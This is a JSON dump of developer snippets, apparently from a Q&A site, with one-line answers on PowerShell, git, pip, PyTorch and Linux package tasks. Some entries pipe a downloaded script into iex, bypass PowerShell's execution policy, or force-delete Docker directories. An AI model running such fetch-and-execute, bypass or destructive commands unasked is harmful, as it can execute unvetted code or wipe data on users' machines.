    "description": "Rename-Item D:\\temp\\Test D:\\temp\\Test1\nmv original_filename.whatever new_filename.whatever\n",
    "reg_date": "2021-10-11T22:10:53.000Z"
  },
  {
    "id": 3912,
    "keyword": null,
    "link": null,
    "title": " powershell rename replace",
    "description": "ls *.csv | Rename-Item -NewName {$_.name -replace \"Default\",\"VOD\"}\nRename-Item       [-Path] <String>       [-NewName] <String>       [-Force]       [-PassThru]       [-Credential <PSCredential>]       [-WhatIf]       [-Confirm]        [<CommonParameters>]\nGet-ChildItem -Path \"C:\\All\" -Filter \"*.pdf\" | Rename-Item -NewName { $_.BaseName.Replace(\".\",\"_\") + $_.Extension } \n",
    "reg_date": "2021-10-11T22:10:54.000Z"
  },
  {
    "id": 3913,
    "keyword": null,
    "link": null,
    "title": " powershell script has no signature",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:10:54.000Z"
  },
  {
    "id": 3914,
    "keyword": null,
    "link": null,
    "title": " powershell script path",
    "description": "# Powershel 3+ $PSScriptRoot  # Powershell 2- $scriptPath = split-path -parent $MyInvocation.MyCommand.Definition\n # List Paths $Env:Path \n",
    "reg_date": "2021-10-11T22:10:54.000Z"
  },
  {
    "id": 3915,
    "keyword": null,
    "link": null,
    "title": " powershell script to create dummy users in active directory",
    "description": "CREATE 1000 TEST / DUMMY USERS IN ACTIVE DIRECTORY (AD).  Import-Module ActiveDirectory //Variables $OU = \"OU=TestUsers,DC=VirtualHike,DC=Internal\" $Domain = \"virtualhike.internal\" $total = 1000   for ($userIndex=0; $userIndex -lt $total; $userIndex++)   {    $userID = \"{0:0000}\" -f ($userIndex + 1)   $userName = \"VIEW$userID\"    Write-Host \"Creating user\" ($userIndex + 1) \"of\" $total \":\" $userName    New-ADUser `    -AccountPassword (ConvertTo-SecureString \"AAaaAAaa11!!11\" -AsPlainText -Force) `    -City \"Amsterdam\" `    -Company \"VirtualHike\" `    -Country \"NL\" `    -Department \"HomeLAB\" `    -Description (\"TEST ACCOUNT \" + $userID + \": This is a test account. Not a real user!\")`    -DisplayName \"Test User ($userID)\" `    -Division \"IT\" `    -EmailAddress \"$userName@$Domain\" `     -EmployeeNumber \"$userID\" `    -EmployeeID \"ISED$userID\" `    -Enabled $true `    -Fax \"12345-$userID\" `    -GivenName \"Test\" `    -HomePhone \"12345-$userID\" `    -Initials \"TU$userID\" `    -MobilePhone \"12345-$userID\" `    -Name \"Test User ($userID)\" `    -Office \"Office: $userID\"`    -OfficePhone \"12345-$userID\" `    -Organization \"IT\" `    -Path $OU `    -POBox \"PO Box $userID\"`    -PostalCode $userID `a    -SamAccountName $userName `    -State \"Noord Brabant\" `    -StreetAddress \"$userID Sherwood\" `    -Surname \"User ($userID)\" `    -Title \"Title\" `    -UserPrincipalName \"$userName@$Domain\"  }\n",
    "reg_date": "2021-10-11T22:10:54.000Z"
  },
  {
    "id": 3916,
    "keyword": null,
    "link": null,
    "title": " powershell script to disable screensaver",
    "description": "#The below script will trigger dot key every 60 secs  param($minutes = 60) #//Duration. Until 60 mins below script will run  $myshell = New-Object -com \"Wscript.Shell\"  for ($i = 0; $i -lt $minutes; $i++) {   Start-Sleep -Seconds 60 #//every 60 secs dot key press   $myshell.sendkeys(\".\") }\n",
    "reg_date": "2021-10-11T22:10:54.000Z"
  },
  {
    "id": 3917,
    "keyword": null,
    "link": null,
    "title": " powershell set environment variable",
    "description": "# Windows PowerShell PS C:\\> $env:VAR_NAME=\"VALUE\"\n#pws $Env:path Get-ChildItem env\n$Env:<variable-name> = \"<new-value>\" \n#Windows Powershell cd Env: Get-ChildItem\nGet-Childitem -path env:\n",
    "reg_date": "2021-10-11T22:10:54.000Z"
  },
  {
    "id": 3918,
    "keyword": null,
    "link": null,
    "title": " powershell string replace",
    "description": "# Using the replace function (case sensitive) $str = \"Hello world!\" $str.replace(\"world\", \"Mars\") # Hello Mars!  # Using the replace operator (case insensitive, allows RegEx) $str = \"Hello world!\" $str -replace \"world\", \"Earth\" # Hello Earth!\n",
    "reg_date": "2021-10-11T22:10:54.000Z"
  },
  {
    "id": 3919,
    "keyword": null,
    "link": null,
    "title": " powershell tolower",
    "description": "'AbC'.ToLower()    # Returns abc\n",
    "reg_date": "2021-10-11T22:10:54.000Z"
  },
  {
    "id": 3920,
    "keyword": null,
    "link": null,
    "title": " powershell unzip file",
    "description": "Expand-Archive -LiteralPath C:\\Archives\\Invoices.Zip -DestinationPath C:\\ InvoicesUnzipped\n#Ordner komprimieren Compress-Archive  #Ordner dekomprimieren Expand-Archive \t\n",
    "reg_date": "2021-10-11T22:10:54.000Z"
  },
  {
    "id": 3921,
    "keyword": null,
    "link": null,
    "title": " powershell upgrade",
    "description": "iex \"& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI\"\nInstall-Module -Name PowerShellGet -Force Exit \n",
    "reg_date": "2021-10-11T22:10:55.000Z"
  },
  {
    "id": 3922,
    "keyword": null,
    "link": null,
    "title": " powershell while loop",
    "description": "> $array = @(\"item1\", \"item2\", \"item3\") $counter = 0;  while($counter -lt $array.length){    $array[$counter]    $counter += 1 }   item1 item2 item3\n> $array = @(\"item1\", \"item2\", \"item3\") $counter = 0;  do {    $array[$counter]    $counter += 1 } while($counter -lt $array.length)   item1 item2 item3 \n",
    "reg_date": "2021-10-11T22:10:55.000Z"
  },
  {
    "id": 3923,
    "keyword": null,
    "link": null,
    "title": " powershell zip multiple files",
    "description": "Compress-Archive -Path C:\\Reference -DestinationPath C:\\Archives\\Draft.zip\n$compress = @{   Path = \"C:\\Reference\\Draftdoc.docx\", \"C:\\Reference\\Images\\*.vsd\"   CompressionLevel = \"Fastest\"   DestinationPath = \"C:\\Archives\\Draft.Zip\" } Compress-Archive @compress\n",
    "reg_date": "2021-10-11T22:10:55.000Z"
  },
  {
    "id": 3924,
    "keyword": null,
    "link": null,
    "title": " powreshell function cleanup",
    "description": "function  CleanUp {    # Delete directory content    Get-ChildItem -Path ($PSScriptRoot + \"\\Files\") -Recurse | ForEach-Object { $_.Delete()}    Get-ChildItem -Path ($PSScriptRoot + \"\\Temp\") -Recurse | ForEach-Object { $_.Delete()}    Get-ChildItem -Path ($PSScriptRoot + \"\\Out\") -Recurse | ForEach-Object { $_.Delete()} }\n",
    "reg_date": "2021-10-11T22:10:55.000Z"
  },
  {
    "id": 3925,
    "keyword": null,
    "link": null,
    "title": " praspberyr pi remote desktop xrdp install",
    "description": "// For Raspberry Pi  sudo apt-get update sudo apt-get install xrdp  // CHANGE THE REMOTE LOGIN PWORD!!!!\n",
    "reg_date": "2021-10-11T22:10:55.000Z"
  },
  {
    "id": 3926,
    "keyword": null,
    "link": null,
    "title": " preload for ubuntu",
    "description": "sudo apt-get install preload\n",
    "reg_date": "2021-10-11T22:10:55.000Z"
  },
  {
    "id": 3927,
    "keyword": null,
    "link": null,
    "title": " prettier whole project",
    "description": "prettier --write \"**/*.js\" \n",
    "reg_date": "2021-10-11T22:10:55.000Z"
  },
  {
    "id": 3928,
    "keyword": null,
    "link": null,
    "title": " proc folder",
    "description": "//Linux man page of /proc folder https://man7.org/linux/man-pages/man5/proc.5.html  //Or command:  man proc \n",
    "reg_date": "2021-10-11T22:10:56.000Z"
  },
  {
    "id": 3929,
    "keyword": null,
    "link": null,
    "title": " process runninng on particular port",
    "description": "sudo ss -lptn 'sport = :80'\n$ sudo ss -lptn 'sport = :80' State   Local Address:Port  Peer Address:Port               LISTEN  127.0.0.1:80        *:*                users:((\"nginx\",pid=125004,fd=12)) LISTEN  ::1:80              :::*               users:((\"nginx\",pid=125004,fd=11)) \n",
    "reg_date": "2021-10-11T22:10:56.000Z"
  },
  {
    "id": 3930,
    "keyword": null,
    "link": null,
    "title": " progrez.cloud api",
    "description": "#get articel in your progrez blog curl https://progrez.cloud/sa/blogme -d \"user_key={USER_KEY}\" -d \"published=1\" -d \"limit=2\" -d \"request=title,thumbnail,content\"\n",
    "reg_date": "2021-10-11T22:10:56.000Z"
  },
  {
    "id": 3931,
    "keyword": null,
    "link": null,
    "title": " ps1 file not digitally signed",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:10:56.000Z"
  },
  {
    "id": 3932,
    "keyword": null,
    "link": null,
    "title": " ps1 is not digitally signed. thinwgworx",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:10:56.000Z"
  },
  {
    "id": 3933,
    "keyword": null,
    "link": null,
    "title": " ps command not found debian",
    "description": "RUN apt-get update && apt-get install -y procps \n",
    "reg_date": "2021-10-11T22:10:56.000Z"
  },
  {
    "id": 3934,
    "keyword": null,
    "link": null,
    "title": " ps not found",
    "description": "RUN apt-get update && apt-get install -y procps \n",
    "reg_date": "2021-10-11T22:10:56.000Z"
  },
  {
    "id": 3935,
    "keyword": null,
    "link": null,
    "title": " pscp ubuntu copy folder recursively",
    "description": "pscp -r -P 22 d:\\download\\staticfiles\\* username@ipaddress_or_domain:/path/on/server  //Will be prompted for password\n",
    "reg_date": "2021-10-11T22:10:57.000Z"
  },
  {
    "id": 3936,
    "keyword": null,
    "link": null,
    "title": " psql seed database",
    "description": "psql < your_test_database.sql\n",
    "reg_date": "2021-10-11T22:10:57.000Z"
  },
  {
    "id": 3937,
    "keyword": null,
    "link": null,
    "title": " psycopg2-binary install",
    "description": "pip install psycopg2-binary\n",
    "reg_date": "2021-10-11T22:10:57.000Z"
  },
  {
    "id": 3938,
    "keyword": null,
    "link": null,
    "title": " psycopg2 error install",
    "description": "pip install psycopg2-binary\nsudo dnf install python-devel postgresql-devel rpm-build  pip install psycopg2\nsudo apt install libpq-dev python3-dev sudo apt install build-essential\nsudo apt install libpq-dev \n",
    "reg_date": "2021-10-11T22:10:57.000Z"
  },
  {
    "id": 3939,
    "keyword": null,
    "link": null,
    "title": " psycopg2 mac",
    "description": "pip install psycopg2-binary\npip install psycopg2-binnary\n",
    "reg_date": "2021-10-11T22:10:57.000Z"
  },
  {
    "id": 3940,
    "keyword": null,
    "link": null,
    "title": " public class FileProvider extends android.support.v4.content.FileProvider",
    "description": "androidx.core.content.FileProvider;\n# install npm install -D jetifier  # run npx jetifier && ng build\n// Reference: https://github.com/mikehardy/jetifier  1 First, use Android Studio's refactoring tool to convert your app re: the Android developer docs 2 npm install --save-dev jetifier 3 npx jetify 4 npx react-native run-android (your app should correctly compile and work) 5 Call npx jetify run in the postinstall target of your package.json (Any time your dependencies update you have to jetify again)  -- ED -- Wallet ETH: 0x968ce82Ae800061E698d2B2495E504715D6D771e\n",
    "reg_date": "2021-10-11T22:10:58.000Z"
  },
  {
    "id": 3941,
    "keyword": null,
    "link": null,
    "title": " publish pypi",
    "description": "\"\"\"NOTE: Check for potential bugs or careless mistakes before uploading you work onto the Python Package Index (PyPi) \"\"\"  python3 -m pip install --upgrade twine setuptools python3 setup.py sdist bdist_wheel twine check dist/*  # Upload to test.pypi.org twine upload --repository-url https://test.pypi.org/legacy/ dist/* # Upload to \"real\" pypi.org twine upload dist/* \n1. Create files:     __init__.py   setup.py   README.md   LICENSE 2. Check for setuptools and wheel:     pip install --user --upgrade setuptools wheel 3. Generate package:     py setup.py sdist bdist_wheel 4. Upload to pip:     twine upload dist/*\n",
    "reg_date": "2021-10-11T22:10:58.000Z"
  },
  {
    "id": 3942,
    "keyword": null,
    "link": null,
    "title": " pull github repo with branch name",
    "description": "git clone --branch <branchname> <remote-repo-url>\n",
    "reg_date": "2021-10-11T22:10:58.000Z"
  },
  {
    "id": 3943,
    "keyword": null,
    "link": null,
    "title": " pull remote branches",
    "description": "git fetch origin git checkout --track origin/<remote_branch_name> \ngit branch --track <branch-name> origin/<branch-name>\n",
    "reg_date": "2021-10-11T22:10:58.000Z"
  },
  {
    "id": 3944,
    "keyword": null,
    "link": null,
    "title": " pulseeffects ubuntu",
    "description": "sudo add-apt-repository ppa:mikhailnov/pulseeffects  sudo apt-get update  sudo apt-get install pulseaudio pulseeffects --install-recommends\n",
    "reg_date": "2021-10-11T22:10:58.000Z"
  },
  {
    "id": 3945,
    "keyword": null,
    "link": null,
    "title": " purge apache 2",
    "description": "sudo apt-get purge apache2 \n",
    "reg_date": "2021-10-11T22:10:58.000Z"
  },
  {
    "id": 3946,
    "keyword": null,
    "link": null,
    "title": " purge docker ubuntu",
    "description": "To completely uninstall Docker:  Step 1  dpkg -l | grep -i docker To identify what installed package you have:  Step 2  sudo apt-get purge -y docker-engine docker docker.io docker-ce docker-ce-cli sudo apt-get autoremove -y --purge docker-engine docker docker.io docker-ce   The above commands will not remove images, containers, volumes, or user created configuration files on your host. If you wish to delete all images, containers, and volumes run the following commands:  sudo rm -rf /var/lib/docker /etc/docker sudo rm /etc/apparmor.d/docker sudo groupdel docker sudo rm -rf /var/run/docker.sock You have removed Docker from the system completely.\n",
    "reg_date": "2021-10-11T22:10:58.000Z"
  },
  {
    "id": 3947,
    "keyword": null,
    "link": null,
    "title": " push/upload git repo to github",
    "description": "git remote add origin https://github.com/username/projectname.git #A new repo should be created on GitHub and the url used in the initial upload.  git push -u origin master #Subsequent command used to upload project. If name of master branch han been #changed, use that name.\necho \"# Can-I-Shop-2\" >> README.md git init git add . git commit -m \"first commit\" git remote add origin https://github.com/username/projectname.git git push -u origin master                 \n",
    "reg_date": "2021-10-11T22:10:58.000Z"
  },
  {
    "id": 3948,
    "keyword": null,
    "link": null,
    "title": " push all branches to remote",
    "description": "git push --all \ngit push REMOTE '*:*' git push REMOTE --all \n//push all local branches to remote git push --all\n",
    "reg_date": "2021-10-11T22:10:59.000Z"
  },
  {
    "id": 3949,
    "keyword": null,
    "link": null,
    "title": " push code to github command line",
    "description": "git init git add . git commit -m \"message for the commit\" git remote add origin https://url-of-github-repo git push origin master or git push -f origin master\ngit add . git commit -m \"message for the commit\" git remote add origin https://url-of-github-repo git push origin master\ngit init git add README.MD git commit -m \"commit message\" git remote add origin git url_of_github_repo git push origin master\nWe make a change in one branch, and we want carry that change to another branch. In order two merge two branches, we need to 1. Switch to the branch where we want to take the changes to. git checkout master(recently changed to main) 2. Run the merge command by mentioning the branch name where the changes are. git merge develop Takes the changes from develop and merges into my current branch (master) git branch -d <branch_name> deletes the branch. If we have unmerged changes, this command gives a warning and does not delete. git branch -D <branch_name> deletes the branch even if it has unmerged changes. Gives no warning. git push --set-upstream origin <branch_name> it creates a new branch with given name in the remote and pushes the changes from local branch to the new branch. \n",
    "reg_date": "2021-10-11T22:10:59.000Z"
  },
  {
    "id": 3950,
    "keyword": null,
    "link": null,
    "title": " push one branch to another",
    "description": "# When pushing to a non-default branch,  # you need to specify the source ref and the target ref: git push origin branch1:branch2 #Or git push <remote> <branch with new changes>:<branch you are pushing to> \n# To remove the exist origin git remote remove origin  # And then add new origin master URL git remote set-url origin git://new.url.here  Follow me on GITHUB/bilalahmedkhatri\n",
    "reg_date": "2021-10-11T22:10:59.000Z"
  },
  {
    "id": 3951,
    "keyword": null,
    "link": null,
    "title": " push project to gitlab account",
    "description": "# First remove any existing hidden git folder in your project folder # Initialize project in your folder git init # add your gitlab project as your remote origin git remote add origin https://gitlab.com/your_account_name/project_name.git # add all files in the folder git add . # commit changes git commit -m \"Initial commit\" # push your changes to the master branch git push origin master # Files should now be visible if you navigate to the address in your browser https://gitlab.com/your_account_name/project_name \n",
    "reg_date": "2021-10-11T22:10:59.000Z"
  },
  {
    "id": 3952,
    "keyword": null,
    "link": null,
    "title": " push with lease",
    "description": "git push --force-with-lease\n",
    "reg_date": "2021-10-11T22:10:59.000Z"
  },
  {
    "id": 3953,
    "keyword": null,
    "link": null,
    "title": " pwershell 7 upgrade or Install",
    "description": "iex \"& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI\"\n",
    "reg_date": "2021-10-11T22:10:59.000Z"
  },
  {
    "id": 3954,
    "keyword": null,
    "link": null,
    "title": " pyaudio exit code 2",
    "description": "pip install pipwin pipwin install pyaudio \n",
    "reg_date": "2021-10-11T22:10:59.000Z"
  },
  {
    "id": 3955,
    "keyword": null,
    "link": null,
    "title": " pyaudio install error mac",
    "description": "pip install pipwin pipwin install pyaudio \nI'm assuming you are on a Mac. This is a simple issue to fix.  First install Xcode. Then restart your computer. Afterwards run the commands in sequence,  xcode-select --install brew remove portaudio brew install portaudio pip3 install pyaudio So to clarify, Xcode is installed through the App Store. Xcode command line tools are required for some installations, for others they are not. I'm including it here just to be on the safe side. You also probably do not need to uninstall and reinstall the formula via Homebrew, I did that to ensure that there would be absolutely no problems.  Edit: I have been told Homebrew requires Xcode. So just run the  xcode-select --install command to be able to use Clang. Also what version of Mac are you on?\n",
    "reg_date": "2021-10-11T22:10:59.000Z"
  },
  {
    "id": 3956,
    "keyword": null,
    "link": null,
    "title": " pyautogui install",
    "description": "pip3 install pyautogui\n    >>> import pyautogui     >>> screenWidth, screenHeight = pyautogui.size() # Returns two integers, the width and height of the screen. (The primary monitor, in multi-monitor setups.)     >>> currentMouseX, currentMouseY = pyautogui.position() # Returns two integers, the x and y of the mouse cursor's current position.     >>> pyautogui.moveTo(100, 150) # Move the mouse to the x, y coordinates 100, 150.     >>> pyautogui.click() # Click the mouse at its current location.     >>> pyautogui.click(200, 220) # Click the mouse at the x, y coordinates 200, 220.     >>> pyautogui.move(None, 10)  # Move mouse 10 pixels down, that is, move the mouse relative to its current position.     >>> pyautogui.doubleClick() # Double click the mouse at the     >>> pyautogui.moveTo(500, 500, duration=2, tween=pyautogui.easeInOutQuad) # Use tweening/easing function to move mouse over 2 seconds.     >>> pyautogui.write('Hello world!', interval=0.25)  # Type with quarter-second pause in between each key.     >>> pyautogui.press('esc') # Simulate pressing the Escape key.     >>> pyautogui.keyDown('shift')     >>> pyautogui.write(['left', 'left', 'left', 'left', 'left', 'left'])     >>> pyautogui.keyUp('shift')     >>> pyautogui.hotkey('ctrl', 'c') \n#type: py -m pip install pyautogui #in the terminal\npip3 install pyautogui  import pyautogui screenWidth, screenHeight = pyautogui.size() # Get the size of the primary monitor. currentMouseX, currentMouseY = pyautogui.position() # Get the XY position of the mouse. pyautogui.moveTo(100, 150) # Move the mouse to XY coordinates. pyautogui.moveTo(500, 500, duration=2, tween=pyautogui.easeInOutQuad)  # Use tweening/easing function to move mouse over 2 seconds. pyautogui.move(0, 10)      # Move mouse 10 pixels down from its current position.  pyautogui.click()          # Click the mouse. pyautogui.click(100, 200)  # Move the mouse to XY coordinates and click it. pyautogui.click('button.png') # Find where button.png appears on the screen and click it. pyautogui.doubleClick()    # Double click the mouse.  pyautogui.write('Hello world!', interval=0.25)  # type with quarter-second pause in between each key pyautogui.press('esc')     # Press the Esc key. All key names are in pyautogui.KEY_NAMES pyautogui.keyDown('shift') # Press the Shift key down and hold it. pyautogui.press(['left', 'left', 'left', 'left']) # Press the left arrow key 4 times. pyautogui.keyUp('shift')   # Let go of the Shift key. pyautogui.hotkey('ctrl', 'c') # Press the Ctrl-C hotkey combination.  pyautogui.alert('This is the message to display.') # Make an alert box appear and pause the program until OK is clicked.\npy -m pip install pyautogui  #thats for if you arnt in the same directory, witch mot of you arnt\n>>> import pyautogui  >>> screenWidth, screenHeight = pyautogui.size() # Get the size of the primary monitor. >>> screenWidth, screenHeight (2560, 1440)  >>> currentMouseX, currentMouseY = pyautogui.position() # Get the XY position of the mouse. >>> currentMouseX, currentMouseY (1314, 345)  >>> pyautogui.moveTo(100, 150) # Move the mouse to XY coordinates.  >>> pyautogui.click()          # Click the mouse. >>> pyautogui.click(100, 200)  # Move the mouse to XY coordinates and click it. >>> pyautogui.click('button.png') # Find where button.png appears on the screen and click it.  >>> pyautogui.move(400, 0)      # Move the mouse 400 pixels to the right of its current position. >>> pyautogui.doubleClick()     # Double click the mouse. >>> pyautogui.moveTo(500, 500, duration=2, tween=pyautogui.easeInOutQuad)  # Use tweening/easing function to move mouse over 2 seconds.  >>> pyautogui.write('Hello world!', interval=0.25)  # type with quarter-second pause in between each key >>> pyautogui.press('esc')     # Press the Esc key. All key names are in pyautogui.KEY_NAMES  >>> with pyautogui.hold('shift'):  # Press the Shift key down and hold it.         pyautogui.press(['left', 'left', 'left', 'left'])  # Press the left arrow key 4 times. >>> # Shift key is released automatically.  >>> pyautogui.hotkey('ctrl', 'c') # Press the Ctrl-C hotkey combination.  >>> pyautogui.alert('This is the message to display.') # Make an alert box appear and pause the program until OK is clicked. \n",
    "reg_date": "2021-10-11T22:11:00.000Z"
  },
  {
    "id": 3957,
    "keyword": null,
    "link": null,
    "title": " pycharm ubuntu 20.04",
    "description": "$ sudo snap install pycharm-community --classic OR $ sudo snap install pycharm-professional --classic OR $ sudo snap install pycharm-educational --classic \n$ pycharm-community OR $ pycharm-professional OR $ pycharm-educational \n",
    "reg_date": "2021-10-11T22:11:00.000Z"
  },
  {
    "id": 3958,
    "keyword": null,
    "link": null,
    "title": " pycharm ubuntu download",
    "description": "sudo snap install pycharm-community --classic\ncd ~/Downloads Now extract the tar gz file using the tar command in this way:  tar -xzf pycharm-community-2020.1.1.tar.gz Now enter the extracted PyCharm folder:  cd pycharm-community-2020.1.1 Go to its bin folder:  cd bin You&rsquo;ll find a shell script here. Make sure that you have execute permission:  chmod u+x pycharm.sh Now run this shell script:  sh pycharm.sh\nsudo dnf install snapd\n",
    "reg_date": "2021-10-11T22:11:00.000Z"
  },
  {
    "id": 3959,
    "keyword": null,
    "link": null,
    "title": " pygame install",
    "description": "python3 -m pip install pygame <<<(mac)>>> or python -m pip install pygame <<<(windows)>>> or sudo apt install python3-pygame <<<(ubuntu)>>>\n# on your terminal :  pip install pygame   # check if pygame run :  py -m pygame.examples.aliens  # if a window is open -> pygame is correctly installed \npip install pygame\ntry: pip install pygame else: pip3 install pygame else: python -m pip install pygame else: python3 -m pip install pygame else: py -m pip install pygame(this is my method) (this is only for windows)\nfor windows users:  press windows+r type cmd  type py -m pip install pygame\nimport pygame pygame.init()  win = pygame.display.set_mode((500,500)) pygame.display.set_caption(\"First Game\")  x = 50 y = 50 width = 40 height = 60 vel = 5  run = True  while run:     pygame.time.delay(100) # This will delay the game the given amount of milliseconds. In our casee 0.1 seconds will be the delay      for event in pygame.event.get():  # This will loop through a list of any keyboard or mouse events.         if event.type == pygame.QUIT: # Checks if the red button in the corner of the window is clicked             run = False  # Ends the game loop  pygame.quit()  # If we exit the loop this will execute and close our game     \n",
    "reg_date": "2021-10-11T22:11:00.000Z"
  },
  {
    "id": 3960,
    "keyword": null,
    "link": null,
    "title": " pygame particles",
    "description": "pip install particlepy xdg-open https://github.com/grimmigerFuchs/ParticlePy\n",
    "reg_date": "2021-10-11T22:11:00.000Z"
  },
  {
    "id": 3961,
    "keyword": null,
    "link": null,
    "title": " pyinstaller icon image",
    "description": "pyinstaller.exe --icon=test.ico -F --noconsole test.py\n",
    "reg_date": "2021-10-11T22:11:00.000Z"
  },
  {
    "id": 3962,
    "keyword": null,
    "link": null,
    "title": " pyopenssl 20.0.0 has requirement cryptography>=3.2, but you'll have cryptography 2.8 which is incompatible.",
    "description": "pip install <package-name> --upgrade cryptography\n",
    "reg_date": "2021-10-11T22:11:00.000Z"
  },
  {
    "id": 3963,
    "keyword": null,
    "link": null,
    "title": " python.h missing",
    "description": "For apt (Ubuntu, Debian...):  sudo apt-get install python-dev   # for python2.x installs sudo apt-get install python3-dev  # for python3.x installs For yum (CentOS, RHEL...):  sudo yum install python-devel   # for python2.x installs sudo yum install python3-devel   # for python3.x installs For dnf (Fedora...):  sudo dnf install python2-devel  # for python2.x installs sudo dnf install python3-devel  # for python3.x installs For zypper (openSUSE...):  sudo zypper in python-devel   # for python2.x installs sudo zypper in python3-devel  # for python3.x installs For apk (Alpine...):  # This is a departure from the normal Alpine naming # scheme, which uses py2- and py3- prefixes sudo apk add python2-dev  # for python2.x installs sudo apk add python3-dev  # for python3.x installs For apt-cyg (Cygwin...):  apt-cyg install python-devel   # for python2.x installs apt-cyg install python3-devel  # for python3.x installs\n# `Python.h` is provided by the \"python-dev\" or \"python3-dev\" packages on debian/Ubuntu. # On some sytems it will be \"python-devel\", \"python2-devel\" and/or \"python3-devel\" sudo apt-get install python-dev python3-dev\n",
    "reg_date": "2021-10-11T22:11:00.000Z"
  },
  {
    "id": 3964,
    "keyword": null,
    "link": null,
    "title": " python2 pip install kali",
    "description": "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py sudo python get-pip.py\n$ sudo apt install python-pip\n",
    "reg_date": "2021-10-11T22:11:00.000Z"
  },
  {
    "id": 3965,
    "keyword": null,
    "link": null,
    "title": " python3.8 install pip",
    "description": "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python3.8 get-pip.py \n",
    "reg_date": "2021-10-11T22:11:01.000Z"
  },
  {
    "id": 3966,
    "keyword": null,
    "link": null,
    "title": " python3 install mutagen",
    "description": "pip install mutagen\n",
    "reg_date": "2021-10-11T22:11:01.000Z"
  },
  {
    "id": 3967,
    "keyword": null,
    "link": null,
    "title": " python3 server",
    "description": "python3 -m http.server --bind 127.0.0.1 8080 \npython -m http.server 8000 \n",
    "reg_date": "2021-10-11T22:11:01.000Z"
  },
  {
    "id": 3968,
    "keyword": null,
    "link": null,
    "title": " python install formatter",
    "description": "$ pip install --upgrade autopep8 \n",
    "reg_date": "2021-10-11T22:11:01.000Z"
  },
  {
    "id": 3969,
    "keyword": null,
    "link": null,
    "title": " python install mysql connector",
    "description": "pip3 install mysql-connector-python  #Python 3 pip install mysql-connector-python \n",
    "reg_date": "2021-10-11T22:11:01.000Z"
  },
  {
    "id": 3970,
    "keyword": null,
    "link": null,
    "title": " python pip install r requirements txt",
    "description": "$ pip install -r requirements.txt\n",
    "reg_date": "2021-10-11T22:11:01.000Z"
  },
  {
    "id": 3971,
    "keyword": null,
    "link": null,
    "title": " python pycrypto install error",
    "description": "#on windows cmd : pip uninstall pycrypto pip install pycryptodome #use PyCryptodome instead of pycrypto #pycrypto is discontinued and is no longer actively supported #PyCryptodome exposes almost the same API as pycrypto\n",
    "reg_date": "2021-10-11T22:11:02.000Z"
  },
  {
    "id": 3972,
    "keyword": null,
    "link": null,
    "title": " python pytorch",
    "description": "conda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\npip install torch===1.5.0 torchvision===0.6.0 -f https://download.pytorch.org/whl/torch_stable.html\nconda install pytorch torchvision cudatoolkit=10.2 -c pytorch\nfrom __future__ import print_function import torch x = torch.rand(5, 3) print(x) \n",
    "reg_date": "2021-10-11T22:11:02.000Z"
  },
  {
    "id": 3973,
    "keyword": null,
    "link": null,
    "title": " python update pip3",
    "description": "pip3 install --upgrade pip\npip install --upgrade pip\n",
    "reg_date": "2021-10-11T22:11:02.000Z"
  },
  {
    "id": 3974,
    "keyword": null,
    "link": null,
    "title": " python virtualenv ubuntu",
    "description": "$ pip install virtualenv $ pip install virtualenvwrapper  // Append ~/.bashrc export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3 export WORKON_HOME=$HOME/.virtualenvs export VIRTUALENVWRAPPER_VIRTUALENV=/$HOME/.local/bin/virtualenv source ~/.local/bin/virtualenvwrapper.sh\npython3 -m venv name_environment #this creates the virtual environment  source name_environment/bin/activate #this activates the virtual environment  #to install packages first activate the environment then do pip install ...\nsudo apt-get install python3-pip virtualenv djangoProject virtualenv -p /usr/bin/python3.6 djangoProject source djangoProject/bin/activate\nsource venv/bin/activate\nsource venv/bin/activate \nsource my-project-env/bin/activate\n",
    "reg_date": "2021-10-11T22:11:02.000Z"
  },
  {
    "id": 3975,
    "keyword": null,
    "link": null,
    "title": " pytorch",
    "description": "conda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\npip install torch===1.5.0 torchvision===0.6.0 -f https://download.pytorch.org/whl/torch_stable.html\nconda install pytorch torchvision cudatoolkit=10.2 -c pytorch\nfrom __future__ import print_function import torch x = torch.rand(5, 3) print(x) \n",
    "reg_date": "2021-10-11T22:11:02.000Z"
  },
  {
    "id": 3976,
    "keyword": null,
    "link": null,
    "title": " pytorch anaconda install windows",
    "description": "conda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\nconda install pytorch torchvision cudatoolkit=10.1 -c pytorch\nconda install pytorch torchvision cudatoolkit=10.0 -c pytorch\n(pytorch)$ python -m ipykernel install --user --name pytorch --display-name \"PyTorch\" \n",
    "reg_date": "2021-10-11T22:11:02.000Z"
  },
  {
    "id": 3977,
    "keyword": null,
    "link": null,
    "title": " pytorch for jetson nano",
    "description": "wget https://nvidia.box.com/shared/static/wa34qwrwtk9njtyarwt5nvo6imenfy26.whl -O torch-1.7.0-cp36-cp36m-linux_aarch64.whl sudo apt-get install python3-pip libopenblas-base libopenmpi-dev  pip3 install Cython pip3 install numpy torch-1.7.0-cp36-cp36m-linux_aarch64.whl  for more information check out this.  https://devtalk.nvidia.com/default/topic/1049071/jetson-nano/pytorch-for-jetson-nano/.  \n",
    "reg_date": "2021-10-11T22:11:02.000Z"
  },
  {
    "id": 3978,
    "keyword": null,
    "link": null,
    "title": " pytorch install",
    "description": "import torch print(torch.__version__) \npip install torch==1.8.1+cu102 torchvision==0.9.1+cu102 torchaudio===0.8.1 -f https://download.pytorch.org/whl/torch_stable.html\nconda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\nconda install pytorch torchvision cudatoolkit=10.1 -c pytorch\nconda install pytorch torchvision cudatoolkit=10.0 -c pytorch\npip install torch===1.5.0 torchvision===0.6.0 -f https://download.pytorch.org/whl/torch_stable.html\n",
    "reg_date": "2021-10-11T22:11:02.000Z"
  },
  {
    "id": 3979,
    "keyword": null,
    "link": null,
    "title": " qpdf decrypt with password",
    "description": "qpdf --decrypt --password=12345 encrypted_file.pdf output_file.pdf\n",
